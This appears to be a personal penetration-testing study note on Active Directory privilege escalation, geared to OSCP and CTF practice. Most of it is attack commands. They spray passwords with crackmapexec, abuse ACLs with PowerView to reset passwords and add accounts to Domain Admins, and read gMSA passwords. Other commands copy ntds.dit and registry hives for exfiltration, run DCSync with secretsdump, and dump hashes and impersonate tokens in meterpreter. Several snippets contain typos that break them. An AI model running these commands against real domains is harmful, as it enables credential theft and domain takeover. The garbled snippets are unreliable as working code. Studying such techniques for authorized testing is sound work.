# Active Directory Privilege Escalation
For exploitation see [[AD-Exploitation-Hub]] or general theory and definitions [[Active-Directory-Defined]]. For commands cheatsheet [[Active-Directory-Commands]] or for enumeration see [[Active-Directory-Enumeration-Defined]]. [[Networks/Network-Protocols]] are used extensive, especially [[DNS-Defined]] in AD networks.

THIS VERY WORK IN PROGRESS! AND VERY EARLY THERE ARE BETTER ELSEWHERE

## Scripts
[ADAPE](https://github.com/hausec/ADAPE-Script)

## Tooling

#### Recon Tools

- **DNS**
For more about [[DNS-Defined]], for enumeration for DNS see both 
[[DNS-Recon-Active]] and [[DNS-Recon-Passive]].
- **SMB**
See [SMB tool](SMB-Recon-Cheatsheet.md) and [[RPCClient-Cheatsheet]]
You want to target the subnet and then as you laterally move through the network the Adminstrators and DCs. `crackmapexec smb $IP -u users.txt -p passes.txt`
- **LDAP**
[[LDAP-Recon]]

#### Box Enumeration
[[Active-Directory-Enumeration-Cheatsheet]] and [[Active-Directory-Enumeration-Defined]] 
[[Windows-Privilege-Escalation-Vectors]] maybe required! 

[Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection) is  a github repose that contains ..*"
Nightly builds of common C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines."* 

#### AMSI Bypassing
[[AMSI-Exploitation]] and [[AMSI-Bypassing]]

#### Exploitation Tools
[[Impacket-Cheatsheet]]
[[Kerbrute-Cheatsheet]]
[[Crackmapexec-Cheatsheet]]
[[Rubeus-Cheatsheet]] 
[[Seatbelt-Helpsheet]]
[[Mimikatz-Cheatsheet]]
[[Kekeo-Cheatsheet]]

#### C2s
[[C2-Matrix]]
[[Empire]] - Empire and Starkiller


#### Powerview
PowerView *is a powershell tool to gain network situational awareness one Windows domains."* For a good concatenation of all the [[Powerview-Cheatsheet]] see follow the link.[Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1). Due to AD commands are a restricted to DCs and some(times) Adminstrators. Get PowerView on the box, you need some help. Below are some the commands in the cheatsheet but scenarios included
```powershell
. .\PowerView.ps1				# import PowerView
Import-Module PowerView.ps1		# Use this it is better	
Get-NetDomain					# Like ADDomain but lists less information
Get-NetDomainController				# List all Domain Controller
Get-NetForest					# like AdForest
Get-NetDomainTrust				# like NetDomainTrust

# ACL Abuse
ForceChangePassword use Set-DomainUserPassword
AddMembers use Add-DomainGroupMember
GenericAll use Set-DomainUserPassword or Add-DomainGroupMember or a New-MachineAccount
GenericWrite use Set-DomainObject
WriteOwner use Set-DomainObject
WriteDACL use Add-DomainObjectACL
AllExtendedRights use Set-DomainUserPassword or Add-DomainGroupMember


Find-InterestingDomainShareFile
-CheckAccess
*password*
*sensitive*
*admin*
*login*
*secret*
*unattend*.xml
*vmdk
*creds*
*credential*
*.config
```

#### Bloodhound and Sharphound
Mapping out the Domain and its properties is key to mental digesting the interconnected system of systems, abstract and physical see: [[Neo4j-And-Bloodhound-Guide]].

- Mark users as owned helps with speed in recursive lookups and visual clutter 
- Unroll group Membership in Bloodhound



## Users and Groups
[[Active-Directory-Default-Security-Groups-Table]] also contains addition pwnables possiblities.
```powershell
net user $user $password /add /domain
net group "$groupname" /add $user

# LAPs group can read passwords
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
# Password is in output or Kali lapsdumper
```

`whoami /all` check for [[SePrivilege-Token-Table]]:
For [[SeBackup-Privilege]] can run `robocopy` against any file even when lack permissions. For OSCP proofing and for non CTFs best use of robocopy the NTDSs.dit, system and sam files exfiltrate out, `secretsdump` from [[Impacket-Cheatsheet]], crack or [[Pass-The-Hash]] and elevate. Or you could copy the entire Hive
```powershell
robocopy /b C:\Windows\NTDS\ntds.dit
robocopy /b C:\Windows\System32\config\SYSTEM
robocopy /b C:\Windows\System32\config\SECURITY
```


ReadGMSAPassword
```powershell
$gmsa = Get-ADServiceAccount -Identity $username-of-target-account -Properties 'msds-managedpassword'
$mp = $gmsa.'msds-managedpassword'
$convmp = ConvertFrom-ADManagedPasswordBlob $mp
$passwd = $convmp.'currentpassword'
# Some default groups have $ at the end! Also the $user variable is easier later steps
$user = '$username-of-target'
$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
$cred = Net-Object System-Managemt.automation.pscredential $user,$secpass
```


GenricAll Permission
```powershell
# $cred is the user with generic write
$user = '$username-with-generic-write'
$pass = ConvertTo-SecureString 'yourpasswordgoeshere' -AsPlainText -Force
$cred = Net-Object System-Managemt.automation.pscredential $user,$pass
# Run a command on remote box, but we are using another users credentials
Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-AdAccountPassword -Identity $targetuser -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password123!' -Force)} -Credential $cred 
```
Then Wmi remote in with [[Impacket-Cheatsheet]]
```bash
impacket-wmiexec.py '$domain/$user:$password@domain.local'
```

ForceChangePassword - Bloodhound and [[Powerview-Cheatsheet]]
```powershell
$newpass = ConvertTo-SecureString 'yourpasswordgoeshere' -AsPlainText -Force
# Powerview command
Set-DomainUserPassword - Identity $target -AccountPassword $newPass
```

GenericWrite - [[Powerview-Cheatsheet]]
```powershell
# Without Bloodhound
Import-PowerView.ps1
Invoke-ACLScanner -ResolveGUIDs | ? {$_.identityreferncename -like '$target$'}
Set-DomainObjectOwner -identity 'Domain Admins' -OwnerIdentity $target
Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity $target -Rights all
Add-DomainGroupMember -Idetnity  'Domain Admins' -Members $target
# Log off and on to affect change
```


Account Operators/Write DACL - [[AMSI-Exploitation]]
[[Powerview-Cheatsheet]], [[Evil-winrm-Cheatsheet]] and [[Impacket-Cheatsheet]] or  [[Crackmapexec-Cheatsheet]]
```powershell
# Account Operators can create and modify non-protected users and groups
# Find one - Non-Protect != Protected, but more privileged the better
net user $user $password /add /domain
net group "$Non-Protected-Group" $user /add
net localgroup "Remote Managment Users" $user /add # For Remoting
Bypass-4MSI # Evil-Winrm
# Dump creds with DC-SYNCing and secretsdumps
```
[[AD-DC-Sync-Attack]] 

GetChangesAll/Replication - PrivEsc with [[AD-DC-Sync-Attack]] with [[Impacket-Cheatsheet]]
```bash
secretsdump -just-dc $domain/$user@$DC-ip
# For just ntlms 
-just-dc-ntlm 
```



## Services

If SPN misconfigured Privileges using combinations of [[Active-Directory-Lateral-Movement]] and [[AD-Kerberos-Delegation-Exploitation]].
```powershell
setspn -T medin -Q  */*        # extract all accounts in the SPN - service principle name - service and account mapping
```


## Appendix

#### Metasploit and Proxychains

Metasploit combined with proxychains can used to pivot and access segmented sections of network.
The shells create route through then inaccessable parts of the network can be mapped beyond the shell's address.
To proxy through the network see sections on [[Proxies]] and [[Pivoting-and-Proxying-with-Metasploit]] 

Due to Trusts, pivoting in required to hop to the connection between Domains. 
Trust can be: 
1. Directional - The direction of the trusts flows from a trusting domain to a trusted domain.
1. Transitive - The trust relationship expands beyond just two domains to include other trusted domains.

If inclined meterpreter and its commands:
```meterpreter
migrate 	# Don't forget to migrate to better processes as processes die: lsass.exe
hashdump

use incognito
list_token -u
impersonate_token $TOKEN
```


## References

[10 AD PrivEsc Concepts You MUST Know for Mastering OSCP](https://www.youtube.com/watch?v=xowytiyooBk)
[Snovvcrahs ACL-abuse](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse)
[iredteam](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse)